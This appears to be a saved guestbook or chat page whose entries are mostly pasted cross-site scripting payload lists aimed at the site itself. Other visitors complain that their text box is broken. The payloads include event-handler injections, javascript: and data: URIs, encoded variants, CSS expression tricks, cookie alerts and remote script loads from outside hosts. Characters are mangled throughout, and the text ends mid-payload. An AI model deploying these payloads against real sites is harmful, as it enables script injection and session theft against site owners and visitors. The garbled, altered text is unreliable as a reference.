+<br>"&gt;<img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="w1ndow.open('https://www.google.com/');">
+<br><f0rm><butt0n f0rmaction="j@va$cript:@lert(1)">CLICKME
+<br><x_x><br>
+[2023/01/28 19:32:46][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> </d;v></x_x>
+<br>&lt;$cript itworksinallbrowsers&gt;/*&lt;$cript* */@lert(1)<!--$cript
+<br--><img src="" ?itworksonchrome?\="" 0n3rr0r="@lert(1)" <br="">&lt;$vg&gt;&lt;$cript&gt;//
+c0nfirm(1);<!--$cript </$vg-->
+<br>&lt;$vg&gt;&lt;$cript onlypossibleinopera:-)&gt; @lert(1)
+<br><a aa="" aaa="" aaaa="" aaaaa="" aaaaaa="" aaaaaaa="" aaaaaaaa="" aaaaaaaaa="" aaaaaaaaaa="" href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//jXD97vXD97$criptXDx3A;XD97lert(1)">ClickMe
+<br>&lt;$cript x&gt; @lert(1) <!--$cript 1=2
+<br--><d;v onmouseover="@lert(1)"> style="x:"&gt;
+<br>&lt;--`<img src="Welcome%20To%20My%20Web%20Site%20)_files/%60.html" 0n3rr0r="@lert(1)"> --!&gt;
+<br> 
+&lt;$cript/src=XD100XD97XD116XD97:text/XDx6aXDx61XDx76XDx61XDx73XDx63XDx72XDx69XDx000070XDx074,XDx0061;XDx06c;XDx0065;XDx00000072;XDx00074;(1)&gt;<!--$cript-->
+<br><d;v style="xg-p:@bsolute;top:0;left:0;width:100%;height:100%" onmouseover="pr0mpt(1)" onclick="@lert(1)">x
+<br>"&gt;<img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="w1ndow.open('https://www.google.com/');">
+<br><f0rm><butt0n f0rmaction="j@va$cript:@lert(1)">CLICKME
+<br><x_x><br></x_x></butt0n></f0rm></d;v>
+[2023/01/28 19:32:21][</d;v></a><a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><math><a xl1nk_:href=" jsfiddle.net=" "="" t846h="">click
+<br><embed code="http://businessinfo.co.uk/labs/X_x/X_x.swf" allow$criptaccess="always">
+<br>&lt;$vg content$criptType=text/vbs&gt;&lt;$cript&gt;MsgBox+1
+<br><a href="d@ta:text/html;b64_,&lt;$vg/0nl0ad=XD0061XDx6C;XD101%72t(1)&gt;">X</a><iframe onready_st@techange="XD0061XD006CXD0065XD0072XD0074('XD0061')" w0rksin1e="">
+<br>&lt;$cript&gt;~'XD0061' ; XD0074XD0068XD0072XD006FXD0077 ~ XD0074XD0068XD0069XD0073. XD0061XD006CXD0065XD0072XD0074(~'XD0061')<!--$cript U+
+<br-->&lt;$cript/src="d@ta:text%2FjXD0061vXD0061$cript,XD0061lert('XD0061')"&gt;<!--$cript a=XD0061 & /=%2F
+<br-->&lt;$cript/src=d@ta:text/jXD0061vXD0061XD115XD99XD114XD105XD112XD116,XD0061%6C%65%72%74(/X_x/)&gt;<!--$cript
+<br-->&lt;0bject d@ta=j@va$cript:XD0061XDx6C;XD101%72t(1)&gt;
+<br>&lt;$cript&gt;+-+-1-+-+@lert(1)<!--$cript-->
+<br><bod¥ 0nl0ad="&lt;!--&gt;XD10@lert(1)">
+<br>&lt;$cript itworksinallbrowsers&gt;/*&lt;$cript* */@lert(1)<!--$cript
+<br--><img src="" ?itworksonchrome?\="" 0n3rr0r="@lert(1)" <br="">&lt;$vg&gt;&lt;$cript&gt;//
+c0nfirm(1);<!--$cript </$vg-->
+<br>&lt;$vg&gt;&lt;$cript onlypossibleinopera:-)&gt; @lert(1)
+<br><a aa="" aaa="" aaaa="" aaaaa="" aaaaaa="" aaaaaaa="" aaaaaaaa="" aaaaaaaaa="" aaaaaaaaaa="" href="jXD97vXD97$criptXDx3A;XD97lert(1)">ClickMe
+<br>&lt;$cript x&gt; @lert(1) <!--$cript 1=2
+<br--><d;v onmouseover="@lert(1)"> style="x:"&gt;
+<br>&lt;--`<img src="`" 0n3rr0r="@lert(1)"> --!&gt;
+<br> 
+&lt;$cript/src=XD100XD97XD116XD97:text/XDx6aXDx61XDx76XDx61XDx73XDx63XDx72XDx69XDx000070XDx074,XDx0061;XDx06c;XDx0065;XDx00000072;XDx00074;(1)&gt;<!--$cript-->
+<br><d;v style="xg-p:@bsolute;top:0;left:0;width:100%;height:100%" onmouseover="pr0mpt(1)" onclick="@lert(1)">x</d;v></br></br></img></br></d;v></br></a></br></br></img></br></bod¥></br></br></br></iframe></br></br></embed></br></a></math></d;v></butt0n>
+<br>"&gt;<img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="w1ndow.open('https://www.google.com/');">
+<br><f0rm><butt0n f0rmaction="j@va$cript:@lert(1)">CLICKME
+<br><math><a xl1nk_:href="//jsfiddle.net/t846h/">click
+<br>&lt;0bject d@ta=d@ta:text/html;b64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;<!--0bject-->
+<br><iframe src="d@ta:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<br><a href="d@ta:text/html;blabla,XD60XD115XD99XD114XD105XD112XD116XD32XD115XD114XD99XD61XD34XD104XD116XD116XD112XD58XD47XD47XD115XD116XD101XD114XD110XD101XD102XD97XD109XD105XD108XD121XD46XD110XD101XD116XD47XD102XD111XD111XD46XD106XD115XD34XD62XD60XD47XD115XD99XD114XD105XD112XD116XD62XD8203">Click Me</a>
+<br>&lt;$cript&gt;String.fromCharC0de(97, 108, 101, 114, 116, 40, 49, 41)<!--$cript-->
+<br>‘;@lert(String.fromC
+<br><x_x><br></br></x_x></br></br></br></br></br></br></a></math></butt0n></f0rm></f0rm></d;v>
+[2023/01/28 19:31:54][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> hackers will win<br></d;v>
+[2023/01/28 19:31:39][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><d;v style="width:expression(c0nfirm(1))">X</d;v> {IE7}
+<br><iframe %00="" src="Welcome%20To%20My%20Web%20Site%20)_files/jvacriptlert1.html" <br="">//&lt;f0rm/action=j@va$criptXDx3A;@lert&amp;lpar;d0cument&amp;period;c00kie&amp;rpar;&gt;&lt;input/type='submit'&gt;//
+&lt;br&gt;/*iframe/src*/&lt;iframe/src="&lt;iframe/src=@"/0nl0ad=pr0mpt(1)
+ /*iframe/src*XD
+&lt;br&gt;//|\\ &lt;$cript //|\\ 
+src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\ &lt;/$cript 
+//|\\
+&lt;br&gt;&lt;/font&gt;/&lt;$vg&gt;&lt;style&gt;{srcXDx3A;'&lt;style/0nl0ad=this.0nl0ad=c0nfirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;
+&lt;br&gt;&lt;a/href="j@va$cript:XD13;
+ j@va$cript:pr0mpt(1)"&gt;&lt;input type="X"&gt;
+&lt;br&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=pr0mpt(1)
+&lt;br&gt;&lt;/$vg&gt;''&lt;$vg&gt;&lt;$cript
+ 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;@lertXDx28;1XDx29; {Opera}
+&lt;br&gt;&lt;a 
+href="j@va$cript&amp;colon;XD0061XDx6C;XD101%72t&amp;lpar;1&amp;rpar;"&gt;&lt;butt0n&gt;
+&lt;br&gt;&lt;d;v
+ onmouseover='@lert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/d;v&gt;
+&lt;br&gt;&lt;iframe 
+style="xg-p:@bsolute;top:0;left:0;width:100%;height:100%" 
+onmouseover="pr0mpt(1)"&gt;
+&lt;br&gt;&lt;a 
+href="j@va$cript&amp;colon;@lert&amp;lpar;1&amp;rpar;"&gt;X&lt;/a&gt;
+&lt;br&gt;&lt;embed 
+src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
+&lt;br&gt;&lt;0bject
+ 
+d@ta="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
+&lt;br&gt;&lt;var
+ onmouseover="pr0mpt(1)"&gt;On Mouse Over&lt;/var&gt;
+&lt;br&gt;&lt;a 
+href=j@va$cript&amp;colon;@lert&amp;lpar;d0cument&amp;period;c00kie&amp;rpar;&gt;Click
+ Here&lt;/a&gt;
+&lt;br&gt;&lt;img src="/" =_=" t1tl3="0n3rr0r='pr0mpt(1)'"&gt;
+&lt;br&gt;&lt;%&lt;!--'%&gt;&lt;$cript&gt;@lert(1);&lt;/$cript --&gt;
+&lt;br&gt;&lt;$cript 
+src="d@ta:text/j@va$cript,@lert(1)"&gt;&lt;/$cript&gt;
+&lt;br&gt;&lt;iframe/src \/\/0nl0ad = pr0mpt(1)
+&lt;br&gt;&lt;iframe/onready_st@techange=@lert(1)
+&lt;br&gt;&lt;$vg/0nl0ad=@lert(1)
+&lt;br&gt;&lt;input value=&lt;&gt;&lt;iframe/src=j@va$cript:c0nfirm(1)
+&lt;br&gt;&lt;input type="text" value=`` 
+&lt;d;v/onmouseover='@lert(1)'&gt;X&lt;/d;v&gt;
+&lt;br&gt;http://www.&lt;$cript&gt;@lert(1)&lt;/$cript .com
+&lt;br&gt;&lt;iframe 
+src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;</iframe>
+<br>&lt;$vg&gt;&lt;$cript ?&gt;@lert(1)
+
+
+
+
+
+
+
+
+
+<br><iframe src="j	a	v	a	s	c	r	i	p	t	:a	l	e	r	t	%28	1	%29"></iframe>
+
+
+
+
+
+
+
+
+
+
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/%60xx%20xx%600n3rr0r=@lert(1).html">
+<br><x3ta http-equiv="refresh" content="0;j
+&lt;br&gt;&lt;X_x&gt;&lt;/button&gt;&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;&lt;/iframe&gt;&lt;br&gt;&lt;/d;v&gt;
+[2023/01/28 19:31:12][&lt;a href='/global//185.141.196.229'&gt;/185.141.196.229&lt;/a&gt;]&lt;d;v&gt; &lt;/X_x&gt;
+&lt;br&gt;&lt;$vg&gt;&lt;$cript x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+&lt;br&gt;&lt;x3ta http-equiv=" refresh"="">
+<br><iframe src="Welcome%20To%20My%20Web%20Site%20)_files/jvacriptlertd0cument.html">
+&lt;br&gt;&lt;f0rm&gt;&lt;a 
+href="j@va$cript:XD0061lertXDx28;1XDx29;"&gt;X
+&lt;br&gt;&lt;/$cript&gt;&lt;img/*%00/src="worksinchrome&amp;colon;pr0mptXDx28;1XDx29;"/%00*/0n3rr0r='eval(src)'&gt;
+&lt;br&gt;&lt;img/XD09;XD10;XD11;
+ src=`~` 0n3rr0r=pr0mpt(1)&gt;
+&lt;br&gt;&lt;f0rm&gt;&lt;iframe XD09;XD10;XD11; 
+src="j@va$criptXD58;@lert(1)"XD11;XD10;XD09;;&gt;
+&lt;br&gt;&lt;a 
+href="d@ta:application/x-x509-user-cert;&amp;NewLine;b64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="XD09;XD10;XD11;&gt;X&lt;/a
+&lt;br&gt;http://www.google&lt;$cript
+ .com&gt;@lert(d0cument.location)&lt;/$cript
+&lt;br&gt;&lt;aXD32;hrefXD61;XD91;XD00;XD93;"XD00; 
+onmouseover=pr0mptXD40;1XD41;XD47;XD47;"&gt;XYZ&lt;/a
+&lt;br&gt;&lt;img/src=@XD32;XD13; 0n3rr0r = pr0mpt('XD49;')
+&lt;br&gt;&lt;style/0nl0ad=pr0mptXD40;'XD88;XD83;XD83;'XD41;
+&lt;br&gt;&lt;$cript ^__^&gt;@lert(String.fromCharC0de(49))&lt;/$cript 
+^__^
+&lt;br&gt;&lt;/style XD32;&gt;&lt;$cript XD32; 
+:-(&gt;/**/@lert(d0cument.location)/**/&lt;/$cript XD32; :-(
+&lt;br&gt;XD00;&lt;/f0rm&gt;&lt;input typeXD61;"date" 
+onfocus="@lert(1)"&gt;
+&lt;br&gt;&lt;f0rm&gt;&lt;textarea XD13; 
+onkeyup='XD0061XD006CXD0065XD0072XD0074XDx28;1XDx29;'&gt;
+&lt;br&gt;&lt;$cript /***XD/***/c0nfirm('XD
+&lt;br&gt;&lt;X_x&gt;&lt;/button&gt;&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;</iframe><br></x3ta></d;v>
+[2023/01/28 19:31:09][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> what the hell did u put in my txt box<br></d;v>
+[2023/01/28 19:30:34][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><style>li {list-style-image: url("j@va$cript:@lert('X_x')");}</style></d;v></d;v></d;v></x3ta></x3ta></p><ul><li>X_x<br>
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/vb$cript%20msgbox(%20X_x%20).html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/live$cript%20[code].html">
+<br><bod¥ 0nl0ad="@lert('X_x')">
+<br><bgsound src="j@va$cript:@lert('X_x');">
+<br><br size="&amp;{@lert('X_x')}">
+<br><link rel="stylesheet" href="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20@lert('X_x')%3b.html">
+<br><link rel="stylesheet" href="Welcome%20To%20My%20Web%20Site%20)_files/X_x.css">
+<br><style>@import'http://ha.ckers.org/X_x.css';</style>
+<br><x3ta http-equiv="Link" content="&lt;http://ha.ckers.org/X_x.css&gt;; REL=stylesheet">
+<br><style>bod¥{-moz-binding:url("http://ha.ckers.org/X_xmoz.X_x#X_x")}</style>
+<br><style>@im\port'\ja\vasc\ript:@lert("X_x")';</style>
+<br><img style="X_x:expr/*X_x*/ession(@lert('X_x'))">
+<br>exp/*<a style="no\X_x:noX_x(&quot;*//*&quot;);X_x:ex/*X_x*//*/*/pression(@lert(&quot;X_x&quot;))">
+<br><style type="text/j@va$cript">@lert('X_x');</style>
+<br><style>.X_x{background-image:url("j@va$cript:@lert('X_x')");}</style></a><a class="X_x"></a>
+<br><style type="text/css">bod¥{background:url("j@va$cript:@lert('X_x')")}</style>
+<br><style type="text/css">bod¥{background:url("j@va$cript:@lert('X_x')")}</style>
+<br><x_x style="X_x:expression(@lert('X_x'))">
+<br><x_x style="behavior: url(X_x.htc);">
+<br>¼$cript¾@lert(¢X_x¢)¼/$cript¾
+<br><x3ta http-equiv="refresh" content="0;url=j@va$cript:@lert('X_x');">
+<br><x3ta http-equiv="refresh" content="0;url=d@ta:text/html b64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<br><x3ta http-equiv="refresh" content="0; URL=
+&lt;br&gt;&lt;X_x&gt;&lt;/button&gt;&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;&lt;/iframe&gt;&lt;br&gt;&lt;/d;v&gt;
+[2023/01/28 19:30:08][&lt;a href='/global//185.141.196.229'&gt;/185.141.196.229&lt;/a&gt;]&lt;d;v&gt; &lt;/X_x&gt;
+&lt;br&gt;&lt;IMG SRC=`j@va$cript:@lert(" rsnake="" says,="" 'x_x'")`="">
+<br><a onmouseover="@lert(d0cument.c00kie)">xxs link</a>
+<br><a onmouseover="@lert(d0cument.c00kie)">xxs link</a>
+<br><img """="">&lt;$cript&gt;@lert("X_x")<!--$cript-->"&gt;
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20@lert(String.fromCharC0de(88,83,83))">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/index.html" onmouseover="@lert('xxs')">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/onmouseover=%20@lert('xxs')%20.html">
+<br><img onmouseover="@lert('xxs')">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XD106%253bXD97%253bXD118%253bXD97%253bXD115%253bXD99%253bXD114%253bXD105%25.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XD0000106XD0000097XD0000118XD0000097XD0000115XD0000099XD000.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XDx6AXDx61XDx76XDx61XDx73XDx63XDx72XDx69XDx70XDx74XDx3AXDx6.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/java$cript%20@lert('X_x')%3b.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/javXDx09%3ba$cript%20@lert('X_x')%3b.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/javXDx0A%3ba$cript%20@lert('X_x')%3b.html">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/javXDx0D%3ba$cript%20@lert('X_x')%3b.html">
+<br>perl -e 'print "<img src="Welcome%20To%20My%20Web%20Site%20)_files/).html">";' &gt; out
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XD14%3b%20j@va$cript%20@lert('X_x')%3b.html">
+<br>&lt;$cript/X_x SRC="http://ha.ckers.org/X_x.js"&gt;<!--$cript-->
+<br><bod¥ 0nl0ad!#$%&()*~+-_.,:;?@[="" |\]^`="@lert(&quot;X_x&quot;)">
+<br>&lt;$cript/SRC="http://ha.ckers.org/X_x.js"&gt;<!--$cript-->
+<br>&lt;&lt;$cript&gt;@lert("X_x");//&lt;<!--$cript-->
+<br>&lt;$cript SRC=http://ha.ckers.org/X_x.js?&lt; B &gt;
+<br>&lt;$cript SRC=//ha.ckers.org/.j&gt;
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20@lert('X_x').html" <br=""><x_x></x_x></bod¥></x3ta></x3ta></x3ta></x_x></x_x></x3ta></bod¥></li></ul><br></d;v>
+[2023/01/28 19:29:33][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> not working :/<br></d;v>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:29:00][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><f0rm id="test" xd<butt0n="" f0rm="test" f0rmaction="j@va$cript:j@va$cript:@lert(1)">X
+<br><bod¥ onscroll="j@va$cript:@lert(1)"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus="">
+<br><p style="behavior:url('#default#time2')" end="0" onend="j@va$cript:@lert(1)">
+<br><style>@import'%(css)s';</style>
+<br><style>a{background:url('s1' 's2)}@import j@va$cript:j@va$cript:@lert(1);');}</style>
+<br><x3ta charset="x-imap4-modified-utf7" &&="">&amp;&amp;&lt;$cript&amp;&amp;&gt;j@va$cript:@lert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/$cript&amp;&amp;&gt;
+<br>&lt;$cript onready_st@techange=j@va$cript:j@va$cript:@lert(1);&gt;<!--$cript-->
+<br><style onready_st@techange="j@va$cript:j@va$cript:@lert(1);"></style>
+<br><!--?X_x version="1.0"?--><html:html x_xns:html="http://www.w3.org/1999/xhtml"><html:$cript>j@va$cript:@lert(1);</html:$cript></html:html>
+<br><embed code="%($criptlet)s">
+<br><embed code="j@va$cript:j@va$cript:@lert(1);">
+<br><embed src="Welcome%20To%20My%20Web%20Site%20)_files/%25(j$cript)s.html">
+<br>
+<br>&lt;0bject 0n3rr0r=j@va$cript:j@va$cript:@lert(1)&gt;
+<br><embed type="image" src="Welcome%20To%20My%20Web%20Site%20)_files/%25($criptlet)s.html">
+<br><x_x id="I"><x><c><!--[Cd@ta[<IMG SRC="j@vas]]<![Cd@ta[cript:j@va$cript:@lert(1);"-->]]</c><x></x></x></x_x>
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/&amp;%7Bj@va$cript%20@lert(1)%3b%7D%3b.html">
+<br><a href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//javXD65a$cript:j@va$cript:@lert(1)">test1</a>
+<br><a href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//javXD97a$cript:j@va$cript:@lert(1)">test1</a>
+<br><embed code="d@ta:text/html,&lt;$cript&gt;%(payload)s&lt;/$cript&gt;" width="500" height="500">
+<br><iframe srcdoc="&lt;iframe/srcdoc=&amp;lt;img/src=&amp;apos;&amp;apos;0n3rr0r=j@va$cript:@lert(1)&amp;gt;&gt;">
+&lt;br&gt;';@lert(String.fromCharC0de(88,83,83))//';@lert(String.fromCharC0de(88,83,83))//";
+&lt;br&gt;@lert(String.fromCharC0de(88,83,83))//";@lert(String.fromCharC0de(88,83,83))//--
+&lt;br&gt;&gt;&lt;/$cript&gt;"&gt;'&gt;&lt;$cript&gt;@lert(String.fromCharC0de(88,83,83))&lt;/$cript&gt;
+&lt;br&gt;'';!--"&lt;X_x&gt;=&amp;{()}
+&lt;br&gt;&lt;$cript SRC=http://ha.ckers.org/X_x.js&gt;&lt;/$cript&gt;
+&lt;br&gt;&lt;IMG SRC="j@va$cript:@lert('X_x');"&gt;
+&lt;br&gt;&lt;IMG SRC=j@va$cript:@lert('X_x')&gt;
+&lt;br&gt;&lt;X_x&gt;&lt;/button&gt;&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;</iframe><br>
+[2023/01/28 19:28:32][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20j@va$cript%20@lert(1).html" <br=""><iframe src="Welcome%20To%20My%20Web%20Site%20)_files/%25($criptlet)s.html" <="" <br="">&lt;INPUT TYPE="IMAGE" SRC="j@va$cript:j@va$cript:@lert(1);"&gt;
+&lt;br&gt;&lt;IMG DYNSRC="j@va$cript:j@va$cript:@lert(1)"&gt;
+&lt;br&gt;&lt;IMG LOWSRC="j@va$cript:j@va$cript:@lert(1)"&gt;
+&lt;br&gt;&lt;BGSOUND SRC="j@va$cript:j@va$cript:@lert(1);"&gt;
+&lt;br&gt;&lt;BR SIZE="&amp;{j@va$cript:@lert(1)}"&gt;
+&lt;br&gt;&lt;LAYER SRC="%($criptlet)s"&gt;&lt;/LAYER&gt;
+&lt;br&gt;&lt;LINK REL="stylesheet" HREF="j@va$cript:j@va$cript:@lert(1);"&gt;
+&lt;br&gt;&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;
+&lt;br&gt;&lt;x3ta HTTP-EQUIV="Link" Content="&lt;%(css)s&gt;; REL=stylesheet"&gt;
+&lt;br&gt;&lt;X_x STYLE="behavior: url(%(htc)s);"&gt;
+&lt;br&gt;&lt;STYLE&gt;li {list-style-image: url("j@va$cript:j@va$cript:@lert(1)");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;X_x
+&lt;br&gt;&lt;x3ta HTTP-EQUIV="refresh" CONTENT="0;url=j@va$cript:j@va$cript:@lert(1);"&gt;
+&lt;br&gt;&lt;x3ta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=j@va$cript:j@va$cript:@lert(1);"&gt;
+&lt;br&gt;&lt;IFRAME SRC="j@va$cript:j@va$cript:@lert(1);"&gt;</iframe>
+<br><t@ble background="j@va$cript:j@va$cript:@lert(1)">
+<br><x_x><br></x_x></t@ble></d;v>
+
+
+
+
+
+
+
+[2023/01/28 19:27:29][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> noooooooooooooooo<br></d;v>
+[2023/01/28 19:26:49][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> &lt;d;v&gt;<t1tl3 0npr0pertychange="XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD112;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD43;XD61;XD32;XD39;XD60;XD115;XD116;XD121;XD108;XD101;XD32;XD99;XD111;XD110;XD116;XD101;XD110;XD116;XD101;XD100;XD105;XD116;XD97;XD98;XD108;XD101;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD100;XD105;XD115;XD112;XD108;XD97;XD121;XD58;XD32;XD98;XD108;XD111;XD99;XD107;XD59;XD32;XD119;XD104;XD105;XD116;XD101;XD45;XD115;XD112;XD97;XD99;XD101;XD58;XD32;XD112;XD114;XD101;XD59;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD59;XD34;XD32;XD62;XD104;XD116;XD109;XD108;XD32;XD32;XD123;XD32;XD92;XD110;XD47;XD42;XD32;XD116;XD117;XD114;XD116;XD108;XD44;XD32;XD89;XD111;XD117;XD32;XD99;XD97;XD110;XD32;XD101;XD100;XD105;XD116;XD32;XD116;XD104;XD101;XD109;XD101;XD32;XD108;XD105;XD118;XD101;XD32;XD58;XD41;XD32;XD42;XD47;XD32;XD92;XD110;XD32;XD99;XD111;XD108;XD111;XD114;XD58;XD32;XD100;XD97;XD114;XD107;XD103;XD114;XD101;XD101;XD110;XD59;XD32;XD92;XD110;XD125;XD60;XD47;XD115;XD116;XD121;XD108;XD101;XD62;XD39;"></t1tl3><t1tl3 t1tl3=""><x_x><br></x_x></t1tl3></d;v>
+[2023/01/28 19:25:46][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> cope<br></d;v>
+[2023/01/28 19:22:55][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><t1tl3 0npr0pertychange="XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD112;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD43;XD61;XD32;XD39;XD60;XD115;XD116;XD121;XD108;XD101;XD32;XD99;XD111;XD110;XD116;XD101;XD110;XD116;XD101;XD100;XD105;XD116;XD97;XD98;XD108;XD101;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD100;XD105;XD115;XD112;XD108;XD97;XD121;XD58;XD32;XD98;XD108;XD111;XD99;XD107;XD59;XD32;XD119;XD104;XD105;XD116;XD101;XD45;XD115;XD112;XD97;XD99;XD101;XD58;XD32;XD112;XD114;XD101;XD59;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD59;XD34;XD32;XD62;XD104;XD116;XD109;XD108;XD32;XD32;XD123